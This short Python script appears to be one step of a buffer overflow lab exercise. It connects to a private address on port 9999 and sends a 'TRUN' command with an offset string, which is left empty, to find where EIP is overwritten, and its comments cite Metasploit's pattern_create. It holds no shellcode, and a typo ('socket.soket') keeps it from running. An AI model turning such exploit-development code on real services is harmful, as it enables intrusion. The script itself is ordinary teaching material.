#!/usr/bin/python
### Finding where the offset / where the buffer overflow is which is located at EIP for bof_3_shellcode
### offset code can be created by either line below
### /usr/share/Metasploit-framework/tools/exploit/msf-pattern_create.rb -l 800 (length of 800)
### msf-pattern_create -l 800 (length of 800)


import sys, socket

offset = ""

try:
	s=socket.soket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.1.90',9999))
	s.send(('TRUN /.:/' + offset))
	s.close()
except:
	print "Error connecting to server"
	sys.exit()